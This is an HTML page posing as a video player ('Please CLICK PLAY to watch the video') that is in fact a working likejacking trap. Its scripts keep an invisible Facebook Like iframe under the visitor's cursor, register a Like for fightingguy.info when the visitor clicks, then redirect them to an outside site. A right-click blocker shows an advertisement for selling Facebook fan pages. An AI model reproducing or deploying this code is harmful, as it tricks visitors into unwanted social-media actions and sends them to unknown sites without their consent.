
<html><head>

			<script language=JavaScript>

			var message="Sell your Facebook Fan pages : victorialinn@live.com";

			///////////////////////////////////
			function clickIE4(){
			if (event.button==2){
			alert(message);
			return false;
			}
			}

			function clickNS4(e){
			if (document.layers||document.getElementById&&!document.all){
			if (e.which==2||e.which==3){
			alert(message);
			return false;
			}
			}
			}

			if (document.layers){
			document.captureEvents(Event.MOUSEDOWN);
			document.onmousedown=clickNS4;
			}
			else if (document.all&&!document.getElementById){
			document.onmousedown=clickIE4;
			}

			document.oncontextmenu=new Function("alert(message);return false")

			// --> 
			</script>

<SCRIPT type=text/javascript src="jquery-1.4.2.min.js"></SCRIPT>
<script type="text/javascript">
	var timeFrame;
	$(function() { timeFrame=setInterval("FBAutoLike();", 1599);});
	function FBAutoLike(){
	  if ( $(document.activeElement).attr('id')=="fbframe" ){
		clearInterval(timeFrame);myBoolean=1;
		document.location="http://dont-text.info/widget3.php"; // this is basically for redirection
	  }
	}
</script>


</head><body>
<div style="overflow: hidden; width: 100px; height: 100px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0;opacity: 0.0;" id="fbLikeFrame"><iframe src="http://www.facebook.com/plugins/like.php?href=http://fightingguy.info&amp;layout=standard&amp;show_faces=false&amp;width=450&amp;action=like&amp;font=tahoma&amp;colorscheme=light&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:50px; height:23px;" allowTransparency="true" id="fbframe" name="fbframe"></iframe></div>
<script>
    var myHTMLBody=(document.compatMode=="CSS1Compat")? document.documentElement : document.body; var fbLikeFrame = document.getElementById('fbLikeFrame'); var myBoolean = 0;
    function mouseFollower(e){
	    if (window.event) { fbLikeFrame.style.top = (window.event.y-10)+myHTMLBody.scrollTop+'px'; fbLikeFrame.style.left = (window.event.x-10)+myHTMLBody.scrollLeft+'px'; } 
	    else {fbLikeFrame.style.top = (e.pageY-10)+'px'; fbLikeFrame.style.left = (e.pageX-10)+'px';}
    }   
    document.onmousemove = function(e) {
	   if (myBoolean == 0) {mouseFollower(e);} else fbLikeFrame.style.display = 'none';
    }
</script>

<h3>Please CLICK PLAY to watch the video</h3>
  <script type='text/javascript' src='swfobject.js'></script>
 
<div id='mediaspace'>Please Wait</div>

 
<script type='text/javascript'>
  var so = new SWFObject('player.swf','mpl','650','400','9');
  so.addParam('allowfullscreen','true');
  so.addParam('allowscriptaccess','always');
  so.addParam('wmode','opaque');
  so.addVariable('file','http://www.youtube.com/watch?v=UyoTSQZ2pJ8');
  so.write('mediaspace');

</script>


</body>
</html>
	
	